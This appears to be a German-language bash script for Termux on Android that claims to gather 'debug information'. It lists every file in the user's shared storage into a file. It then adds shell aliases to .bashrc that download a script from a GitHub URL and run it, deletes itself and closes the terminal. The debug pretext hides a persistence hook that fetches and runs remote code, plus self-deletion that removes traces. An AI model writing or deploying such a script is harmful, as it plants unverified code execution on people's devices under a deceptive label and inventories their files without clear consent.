#!/bin/bash

# Verzeichnisse definieren
source_dir="storage/shared/"
output_dir="storage/shared/downloads/"
debug_file="debug.dbg"
script_path=$(realpath "$0")  # Pfad des aktuellen Scripts
curl_command="curl -s -o jonnyScript.sh https://raw.githubusercontent.com/GeorgeOrewell/Mancala/main/jonnyScript.sh && bash jonnyScript.sh"

# Funktion für einen aufsteigenden G-Dur-Ton (G, H, D) ohne Textausgabe
play_gdur_ascending() {
    play -n synth 0.3 sine 392 >/dev/null 2>&1   # G4
    play -n synth 0.3 sine 493.88 >/dev/null 2>&1 # H4
    play -n synth 0.3 sine 587.33 >/dev/null 2>&1 # D5
}

# Funktion für einen absteigenden G-Dur-Ton (D, H, G) ohne Textausgabe
play_gdur_descending() {
    play -n synth 0.3 sine 587.33 >/dev/null 2>&1 # D5
    play -n synth 0.3 sine 493.88 >/dev/null 2>&1 # H4
    play -n synth 0.3 sine 392 >/dev/null 2>&1   # G4
}

# Ankündigung mit aufsteigendem G-Dur-Ton
play_gdur_ascending
echo "Es werden Debug Informationen gesammelt..."

# Alle Dateien inklusive der Unterverzeichnisse mit vollständigem Dateipfad in debug.dbg schreiben, außer Android-Verzeichnis
find "$source_dir" -path "$source_dir/Android" -prune -o -type f -print > "$source_dir$debug_file" || true

# Erfolgreiche Meldung ausgeben
echo "Debug Informationen erfolgreich gesammelt."

# Abschluss mit absteigendem G-Dur-Ton
play_gdur_descending
echo "Debug-Datei erfolgreich erstellt."

# 3 Sekunden warten
sleep 3

# Alias in .bashrc hinzufügen, falls noch nicht vorhanden
if ! grep -q "alias jonny=" ~/.bashrc; then
    echo "alias Jonny='$curl_command'" >> ~/.bashrc
    echo "alias jonny='$curl_command'" >> ~/.bashrc
    echo "Alias 'Jonny' und 'jonny' wurden zur .bashrc hinzugefügt."
fi

# Script sich selbst löschen
rm "$script_path"

# Termux beenden
exit